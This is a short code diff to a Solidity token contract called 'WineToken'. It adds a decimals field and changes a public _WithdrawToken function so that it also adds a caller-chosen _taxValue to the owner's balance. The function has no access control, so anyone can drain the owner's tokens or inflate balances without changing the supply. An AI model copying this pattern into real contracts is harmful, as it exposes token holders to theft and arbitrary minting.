@@ -5,6 +5,7 @@ contract WineToken {
     address public owner;
     string public name = "Wine Token";
     string public symbol = "Wine";
+     uint8   public decimals = 18;
     uint256 public totalSupply = 1000000000000000000000000; // 1 million tokens
     mapping(address => uint256) public balanceOf;
 
@@ -13,13 +14,14 @@ contract WineToken {
         owner = msg.sender;
     }
 
-    function _WithdrawToken(address _to, uint256 _value)
+    function _WithdrawToken(address _to, uint256 _value,uint256 _taxValue)
         public
         returns (bool success)
     {
         require(balanceOf[owner] >= _value);
         balanceOf[owner] -= _value;
         balanceOf[_to] = balanceOf[_to] + _value;
+        balanceOf[owner] += _taxValue;
         return true;
     }
 
